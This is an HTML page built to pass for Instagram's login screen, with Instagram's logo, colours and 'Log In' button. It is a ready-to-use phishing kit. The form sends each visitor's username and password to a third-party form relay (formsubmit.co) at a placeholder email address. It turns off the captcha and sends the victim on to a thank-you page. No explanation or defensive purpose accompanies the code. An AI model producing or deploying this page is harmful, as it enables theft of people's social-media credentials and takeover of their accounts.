<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            width: 350px;
            padding: 20px;
            text-align: center;
            border-radius: 5px;
        }
        .logo {
            width: 175px;
            margin-bottom: 20px;
        }
        .input-field {
            width: 100%;
            padding: 10px;
            margin: 5px 0;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            background-color: #fafafa;
            font-size: 14px;
        }
        .login-btn {
            width: 100%;
            padding: 10px;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 14px;
            font-weight: bold;
            margin-top: 10px;
            cursor: pointer;
        }
        .login-btn:disabled {
            background-color: #b2dffc;
        }
        .separator {
            display: flex;
            align-items: center;
            margin: 20px 0;
            color: #8e8e8e;
            font-size: 13px;
        }
        .separator hr {
            flex: 1;
            border: none;
            border-top: 1px solid #dbdbdb;
            margin: 0 10px;
        }
        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #8e8e8e;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram Logo" class="logo">
        <form action="https://formsubmit.co/your-email@gmail.com" method="POST">
            <input type="hidden" name="_next" value="thankyou.html">
            <input type="hidden" name="_captcha" value="false">
            <input type="text" name="username" class="input-field" placeholder="Phone number, username, or email" required>
            <input type="password" name="password" class="input-field" placeholder="Password" required>
            <button type="submit" class="login-btn">Log In</button>
        </form>
        <div class="separator">
            <hr><span>OR</span><hr>
        </div>
        <div class="footer">
            <p>Don't have an account? <a href="https://www.instagram.com" style="color: #0095f6; text-decoration: none;">Sign up</a></p>
        </div>
    </div>
</body>
</html>
